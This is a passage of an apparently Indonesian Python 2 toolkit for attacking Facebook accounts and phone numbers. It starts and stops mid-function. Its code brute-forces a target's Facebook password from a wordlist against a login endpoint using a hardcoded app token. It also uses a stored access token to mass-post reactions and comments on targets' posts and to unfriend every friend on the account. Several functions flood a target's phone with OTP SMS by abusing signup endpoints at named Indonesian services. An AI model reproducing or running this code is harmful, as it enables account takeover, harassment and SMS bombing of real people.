                                            print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass4
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    super()


def brute():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('reset')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        try:
            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail\x1b[1;97m/\x1b[1;92mHp \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
            print '\x1b[1;91m[+] \x1b[1;92mJumlah\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mMencoba \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                        print 40 * '\x1b[1;97m\xe2\x95\x90'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                            print 40 * '\x1b[1;97m\xe2\x95\x90'
                            print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Koneksi Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File tidak ditemukan...'
            print '\n\x1b[1;91m[!] \x1b[1;92mSepertinya kamu tidak memiliki wordlist'
            tanyaw()


def tanyaw():
    why = raw_input('\x1b[1;91m[?] \x1b[1;92mIngin membuat wordlist ? \x1b[1;92m[y/t]\x1b[1;91m:\x1b[1;97m ')
    if why == '':
        print '\x1b[1;91m[!] Tolong pilih \x1b[1;97m(y/t)'
        tanyaw()
    else:
        if why == 'y':
            wordlist()
        else:
            if why == 'Y':
                wordlist()
            else:
                if why == 't':
                    menu_hack()
                else:
                    if why == 'T':
                        menu_hack()
                    else:
                        print '\x1b[1;91m[!] Tolong pilih \x1b[1;97m(y/t)'
                        tanyaw()


def menu_bot():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    banner()
    print
    print '\x1b[1;36;40m[\x1b[1;37;40m1\x1b[1;36;40m]\x1b[1;37;40m Bot reactions target post'
    print '\x1b[1;36;40m[\x1b[1;37;40m2\x1b[1;36;40m]\x1b[1;37;40m Bot reactions group post'
    print '\x1b[1;36;40m[\x1b[1;37;40m3\x1b[1;36;40m]\x1b[1;37;40m Bot komen target post'
    print '\x1b[1;36;40m[\x1b[1;37;40m4\x1b[1;36;40m]\x1b[1;37;40m Bot komen group post'
    print '\x1b[1;36;40m[\x1b[1;37;40m5\x1b[1;36;40m]\x1b[1;37;40m Hapus postingan facebook'
    print '\x1b[1;36;40m[\x1b[1;37;40m6\x1b[1;36;40m]\x1b[1;37;40m Hapus pertemanan facebook'
    print '\x1b[1;36;40m[\x1b[1;37;40m7\x1b[1;36;40m]\x1b[1;37;40m Terima pertemanan facebook'
    print '\x1b[1;37;40m[\x1b[1;36;40m0\x1b[1;37;40m]\x1b[1;36;40m Kembali ke MENU UTAMA'
    print
    bot_pilih()


def bot_pilih():
    bots = raw_input('\x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;96mpilih :\x1b[1;93m ')
    if bots == '':
        print
        print ("\033[1;97mpilih yang benar.......!!!")
	print
        bot_pilih()
    else:
        if bots == '1':
            menu_react()
        else:
            if bots == '2':
                grup_react()
            else:
                if bots == '3':
                    bot_komen()
                else:
                    if bots == '4':
                        grup_komen()
                    else:
                        if bots == '5':
           			 menu_react()
        		else:
            			if bots == '6':
                			unfriend()
            			else:
                			if bots == '7':
                    				bot_komen()
                			else:
                    				if bots == '0':
                        				menu()
                    				else:
                             				print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + hack + ' \x1b[1;91mTidak ada'
                             				hack_pilih()
                        

def menu_react():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    print 
    print '\x1b[1;36;40m[\x1b[1;37;40m1\x1b[1;36;40m]\x1b[1;37;40m \x1b[1;97mLike'
    print '\x1b[1;36;40m[\x1b[1;37;40m2\x1b[1;36;40m]\x1b[1;37;40m \x1b[1;97mLove'
    print '\x1b[1;36;40m[\x1b[1;37;40m3\x1b[1;36;40m]\x1b[1;37;40m \x1b[1;97mWow'
    print '\x1b[1;36;40m[\x1b[1;37;40m4\x1b[1;36;40m]\x1b[1;37;40m \x1b[1;97mHaha'
    print '\x1b[1;36;40m[\x1b[1;37;40m5\x1b[1;36;40m]\x1b[1;37;40m \x1b[1;97mSedih'
    print '\x1b[1;36;40m[\x1b[1;37;40m6\x1b[1;36;40m]\x1b[1;37;40m \x1b[1;97mMarah'
    print '\x1b[1;37;40m[\x1b[1;36;40m0\x1b[1;37;40m]\x1b[1;36;40m Kembali'
    print
    react_pilih()


def react_pilih():
    global tipe
    aksi = raw_input('\x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;96mpilih :\x1b[1;93m ')
    print
    if aksi == '':
        print
        print ("\033[1;97mpilih yang benar.......!!!")
	print
        react_pilih()
    else:
        if aksi == '1':
            tipe = 'LIKE'
            react()
        else:
            if aksi == '2':
                tipe = 'LOVE'
                react()
            else:
                if aksi == '3':
                    tipe = 'WOW'
                    react()
                else:
                    if aksi == '4':
                        tipe = 'HAHA'
                        react()
                    else:
                        if aksi == '5':
                            tipe = 'SAD'
                            react()
                        else:
                            if aksi == '6':
                                tipe = 'ANGRY'
                                react()
                            else:
                                if aksi == '0':
                                    menu_bot()
                                else:
                                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + aksi + ' \x1b[1;91mTidak ada'
                                    react_pilih()


def react():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        jalan("\033[1;96m¤"*48)
        ide = raw_input('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;97mMasukan ID Target :\x1b[1;93m ')
        limit = raw_input('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;97mLimit             :\x1b[1;93m ')
        try:
            oh = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            ah = json.loads(oh.text)
            jalan('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;92mTunggu sebentar.....')
            jalan("\033[1;96m¤"*48)
            for a in ah['feed']['data']:
                y = a['id']
                reaksi.append(y)
                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
                print '\x1b[1;96m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;96m] \x1b[1;97m' + tipe

            print
            print '\r\x1b[1;97mSelesai \x1b[1;96m' + str(len(reaksi))
            raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID Tidak ditemukan'
            raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
            menu_bot()


def grup_react():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    print
    print '\x1b[1;36;40m[\x1b[1;37;40m1\x1b[1;36;40m]\x1b[1;37;40m \x1b[1;97mLike'
    print '\x1b[1;36;40m[\x1b[1;37;40m2\x1b[1;36;40m]\x1b[1;37;40m \x1b[1;97mLove'
    print '\x1b[1;36;40m[\x1b[1;37;40m3\x1b[1;36;40m]\x1b[1;37;40m \x1b[1;97mWow'
    print '\x1b[1;36;40m[\x1b[1;37;40m4\x1b[1;36;40m]\x1b[1;37;40m \x1b[1;97mHaha'
    print '\x1b[1;36;40m[\x1b[1;37;40m5\x1b[1;36;40m]\x1b[1;37;40m \x1b[1;97mSedih'
    print '\x1b[1;36;40m[\x1b[1;37;40m6\x1b[1;36;40m]\x1b[1;37;40m \x1b[1;97mMarah'
    print '\x1b[1;37;40m[\x1b[1;36;40m0\x1b[1;37;40m]\x1b[1;36;40m Kembali'
    print
    reactg_pilih()


def reactg_pilih():
    global tipe
    aksi = raw_input('\x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;96mpilih :\x1b[1;93m ')
    print
    if aksi == '':
        print ("\033[1;97mpilih yang benar.......!!!")
	print
        reactg_pilih()
    else:
        if aksi == '1':
            tipe = 'LIKE'
            reactg()
        else:
            if aksi == '2':
                tipe = 'LOVE'
                reactg()
            else:
                if aksi == '3':
                    tipe = 'WOW'
                    reactg()
                else:
                    if aksi == '4':
                        tipe = 'HAHA'
                        reactg()
                    else:
                        if aksi == '5':
                            tipe = 'SAD'
                            reactg()
                        else:
                            if aksi == '6':
                                tipe = 'ANGRY'
                                reactg()
                            else:
                                if aksi == '0':
                                    menu_bot()
                                else:
                                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + aksi + ' \x1b[1;91mTidak ada'
                                    reactg_pilih()


def reactg():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        jalan("\033[1;96m¤"*48)
        ide = raw_input('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;97mMasukan ID group :\x1b[1;93m ')
        limit = raw_input('\x1b[1;96m[\x1b[1;96m!\x1b[1;96m] \x1b[1;97mLimit            :\x1b[1;93m ')
        ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
        asw = json.loads(ah.text)
        print '\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mNama grup        :\x1b[1;93m ' + asw['name']
        try:
            oh = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            ah = json.loads(oh.text)
            jalan('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;92mTunggu sebentar.....')
            jalan("\033[1;96m¤"*48)
            for a in ah['feed']['data']:
                y = a['id']
                reaksigrup.append(y)
                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
                print '\x1b[1;96m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;96m] \x1b[1;97m' + tipe

            print
            print '\r\x1b[1;97mSelesai \x1b[1;96m' + str(len(reaksigrup))
            raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID Tidak ditemukan'
            raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
            menu_bot()


def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        print
        jalan("\033[1;96m¤"*48)
        ide = raw_input('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;97mMasukan ID target :\x1b[1;93m ')
        km = raw_input('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;97mMasukan komentar  :\x1b[1;93m ')
        limit = raw_input('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mLimit             :\x1b[1;93m ')
        try:
            p = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            a = json.loads(p.text)
            jalan('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;92mTunggu sebentar.....')
            jalan("\033[1;96m¤"*48)
            for s in a['feed']['data']:
                f = s['id']
                komen.append(f)
                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
                print '\x1b[1;96m[\x1b[1;97m' + km[:1000].replace('\n', ' ') + '... \x1b[1;96m]'

            print
            print '\r\x1b[1;97mSelesai \x1b[1;96m' + str(len(komen))
            raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID Tidak ditemukan'
            raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
            menu_bot()


def grup_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
    	print
        jalan("\033[1;96m¤"*48)
        ide = raw_input('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;97mMsukan ID group   :\x1b[1;93m ')
        km = raw_input('\x1b[1;96m[\x1b[1;97m+\x1b[1;96m] \x1b[1;97mMasukan komentar  :\x1b[1;93m ')
        limit = raw_input('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mLimit             :\x1b[1;93m ')
        try:
            ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
            asw = json.loads(ah.text)
            print '\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;97mNama grup         :\x1b[1;93m ' + asw['name']
            p = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            a = json.loads(p.text)
            jalan('\x1b[1;96m[\x1b[1;97m!\x1b[1;96m] \x1b[1;92mTunggu sebentar.....')
            jalan("\033[1;96m¤"*48)
            for s in a['feed']['data']:
                f = s['id']
                komengrup.append(f)
                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
                print '\x1b[1;96m[\x1b[1;97m' + km[:10].replace('\n', ' ') + '... \x1b[1;96m]'

            print
            print '\r\x1b[1;97mSelesai \x1b[1;96m' + str(len(komengrup))
            raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID Tidak ditemukan'
            raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
            menu_bot()


def unfriend():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	print
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print "\033[1;97mStop \033[1;91mCTRL+C"
	print 42*"\033[1;97m═"
	try:
		pek = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
		cok = json.loads(pek.text)
		for i in cok['data']:
			nama = i['name']
			id = i['id']
			requests.delete("https://graph.facebook.com/me/friends?uid="+id+"&access_token="+toket)
			print "\033[1;97m[\033[1;92m Deleted \033[1;97m] "+nama
	except IndexError: pass
	except KeyboardInterrupt:
		print "\033[1;91m[!] Stopped"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	print"\n\033[1;91m[+] \033[1;92mDone"
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_bot()


def menu_spam():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    banner()
    print
    print
    print '\x1b[1;36;40m[\x1b[1;37;40m1\x1b[1;36;40m] \x1b[1;37;40mSpam sms unlimited'
    print '\x1b[1;36;40m[\x1b[1;37;40m2\x1b[1;36;40m] \x1b[1;37;40mSpam whatsapp unlimited'
    print '\x1b[1;36;40m[\x1b[1;37;40m3\x1b[1;36;40m] \x1b[1;37;40mSpam sms/call unlimited'
    print '\x1b[1;37;40m[\x1b[1;36;40m0\x1b[1;37;40m]\x1b[1;36;40m Kembali ke MENU UTAMA'
    print
    spam_pilih()


def spam_pilih():
    spam = raw_input('\x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;96mpilih :\x1b[1;93m ')
    if spam == '':
        print
        print ("\033[1;97mpilih yang benar.......!!!")
	print
        spam_pilih()
    else:
        if spam == '1':
            Spam()
        else:
            if spam == '2':
                nontelkom()
            else:
                if spam == '3':
                    bingung()
                else:
                    if spam == '0':
                       menu()
                    else:
                        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + spam + ' \x1b[1;91mTidak ada'
                        spam_pilih()

try:
	
	import mechanize, requests, random, sys, os, re
	from time import sleep
	from cookielib import LWPCookieJar as Cookie
	from requests.exceptions import ConnectionError

	os.system('clear')

	def Tik(s):
		for i in s + '\n':
			sys.stdout.write(i)
			sys.stdout.flush()
			sleep(random.random() * 0.0010)


	def MapClub(Phone, Amount):
		for _ in range(Amount):

			sleep(0.01)
			headers = {
			'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
			'Referer' : 'https://mapclub.com/id/user/signup'
			}

			postData = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data = {'phone' : Phone}, allow_redirects = True)

			if 'error' in postData.text:
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' GAGAL'+M+' \xE2\x9C\x96')
			
			else:
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
					
	def Hooq(Phone, Amount):
		for _ in range(Amount):

			sleep(0.01)
			bro = mechanize.Browser()
			Cookies = Cookie('.cookieslog')

			bro.set_handle_robots(False)
			bro.set_cookiejar(Cookies)

			bro.addheaders = [
			('User-Agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9'),
			('Referer', 'https://authenticate.hooq.tv/signupmobile?return?Url=https://www.hooq.tv/auth//verify/ev%2F%257Cid')
			]

			bro.open('https://authenticate.hooq.tv/signupmobile?returnUrl=https://www.hooq.tv%2Fauth%2Fverify%2Fev%2F%257Cid&serialNo=0&deviceType=webClient&modelNo=webclient-aurora&deviceName=webclient-aurora/production-8.4.1&deviceSignature=0')
			bro.select_form(nr=0)		
			bro.form ['mobile'] = str(Phone)
			submit = bro.submit()

			if 'Your+number+has+been+blocked.' in submit.geturl():
				print(W+'NOMOR TARGET UDAH DI BLOKIR\n'+C+'SAMA PIHAK HOOQ. '+W+'COBA NOMOR LAIN ^_^')
				sys.exit() 
			
			elif 'buCode' in submit.geturl():
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
			
			else:
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' GAGAL'+M+' \xE2\x9C\x96')

	def HarVest(Phone, Amount):
		for _ in range(Amount):
		
			sleep(0.01)
			headers = {
			'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
			'Referer' : 'https://harvestcakes.com/register'
			}

			data = {
			'phone' : Phone,
			'url' : ''
			}

			Sess = requests.Session()
			Sess.cookies = Cookie('.cookieslog')
			Sess.headers = headers

			postData = Sess.post('https://harvestcakes.com/register', data = data, allow_redirects = True)

			if 'Enter OTP code we sent via SMS on phone number' in postData.text:
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
				Sess.cookies.save()
			
			else:
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' GAGAL'+M+' \xE2\x9C\x96')

	def Olx(Phone, Amount):
		for _ in range(Amount):
		
			sleep(0.01)
			headers = {
			'user-agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
			'referer' : 'https://www.olx.co.id/'
			}
	
			data = {
			'grantType' : 'phone',
			'phone' : Phone,
			'language' : ''
			}
		
			Sess = requests.Session()
			Sess.cookies = Cookie('.cookieslog')
			Sess.headers = headers
		
			postData = Sess.post('https://www.olx.co.id/api/auth/authenticate', json = data, allow_redirects = True)
		
			if 'PIN' and 'token' in postData.text:
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
				Sess.cookies.save()
			
			else:
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' GAGAL'+M+' \xE2\x9C\x96')
			
	def Tokped(Phone, Amount):
		for _ in range(Amount):
		
			sleep(0.01)
			headers = {
			'Connection' : 'keep-alive',
			'Accept' : 'application/json, text/javascript, */*; q=0.01',
			'Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest',
			'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
			'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8',
			'Accept-Encoding' : 'gzip, deflate'
			}

			TokenSite = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+Phone+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D'+Phone+'%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = headers).text
			SearchToken = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', TokenSite).group(1)
		
			data = {
			'tk' : SearchToken,
			'msisdn' : Phone,
			'otp_type' : '116',
			'number_otp_digit' : '6',
			'email' : '',
			'original_param' : '',
			'user_id' : '',
			'signature' : '',
			}
		
			postData = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-sms', data = data, headers = headers)
		
			if '"success": true' in postData.text:
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
			
			else:
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' GAGAL'+M+' \xE2\x9C\x96')
			
	def AlfaMart(Phone, Amount):
		for _ in range(Amount):
		
			sleep(0.01)
			headers = {
			'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
			'Referer' : 'https://www.alfacart.com/login?tab=daftar&return='
			}
		
			data = {
			'fullName' : 'Yt Jejak Cyber',
			'red' : 'customer%2Faccount',
			'email' : 'jejak@gmail.com',
			'password' : 'Subscribe Channel Gua Yak',
			'isNewsletter' : 'on'
			}
		
			Sess = requests.Session()
			Sess.cookies = Cookie('.cookieslog')
			Sess.headers = headers

			postData = Sess.post('https://www.alfacart.com/getMemberInfo', data = {'email' : 'jejak@gmail.com'})
			postData_2 = Sess.post('https://www.alfacart.com/otp/checkActiveNumber', data = {'phoneNumber' : Phone, 'email' : 'jejak@gmail.com'})
			postData_3 = Sess.post('https://www.alfacart.com/otp/phoneNumberRegistration', data = {'phoneNumber' : Phone})
			postData_4 = Sess.post('https://www.alfacart.com/doRegister', data = data)
		
			if 'responseMessage":"Nomor terverifikasi dan dapat diubah.","status":true' in postData_2.text:
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
				Sess.cookies.save()
			
			else:
				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' GAGAL'+M+' \xE2\x9C\x96')
	
	def Phd(Phone, Amount):
	
		if str(Phone).startswith('08', 0) == True:
			Phone = Phone.replace('08', '8')

		for _ in range(Amount):

			sleep(5)
			headers = {
			'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
			'Referer' : 'https://www.phd.co.id/en/users/createnewuser'
			}

			data = {
			'requests_id' : '',
			'first_name' : 'Subscribe YT',
			'last_name' : 'Jejak Cyber',
			'gender' : 'male',
			'phone_number' : Phone,
			'birthday' : '0000-00-00',
			'username' : 'YouTube@gmail.com',
			'password' : 'Subscribe 1000x Ya Anying',
			'agreeterms' : '1'
			}

			Sess = requests.Session()
			Sess.cookies = Cookie('.cookieslog')
			Sess.headers = headers

			postData = Sess.post('http://www.phd.co.id/en/users/createNewUser', data = data , allow_redirects = True)
			Sess.cookies.save()
		
			print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
		
	def Spam():
		print
		Tik(W+50*'=')
		Tik(C+'\tTOOLS\t\t LIMIT\t\tSTATUS')
		Tik(W+50*'=')
		print
		Tik(C+'['+W+'1'+C+']'+W+' SPAM OTP MAPCLUB'+W+'\tUNLIMITED'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'2'+C+']'+W+' SPAM OTP HOOQ'+W+'\tBELUM TAU'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'3'+C+']'+W+' SPAM OTP HARVEST'+W+'\t6X / 1 HARI'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'4'+C+']'+W+' SPAM OTP OLX'+W+'\tUNLIMITED'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'5'+C+']'+W+' SPAM OTP TOKOPEDIA'+W+'\t3X / 1 HARI'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'6'+C+']'+W+' SPAM OTP ALFAMART'+W+'\t4X / 1 HARI'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'7'+C+']'+W+' SPAM OTP PHD'+W+'\t3X / 1 HARI'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'8'+C+']'+W+' COMBO ALL 3 OTP'+K+'\t    -\t\t'+W+'ACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'9'+C+']'+W+' REPORT BUG'+K+'\t\t    -\t\t'+W+'ACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'X'+C+']'+W+' EXIT / KELUAR'+K+'\t    -\t\t'+W+'ACTIVE'+H+' \xE2\x9C\x94')
		print
		print
		try:
			requests.get('http://google.com')
	
		except ConnectionError:
			print
			print(M+'CEK KONEKSI JARINGAN !')
			sys.exit()
		
		PilihTools = raw_input(W+'Pilih Tools'+C+' ~> '+W+'')
		
		if PilihTools == '1':
			try:
			
				print
				Tik(W+'SPAM OTP MAPCLUB')
				Tik(C+''+16*'=')
				print
				Phone = raw_input(W+'NOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
				
				else:
					pass
				
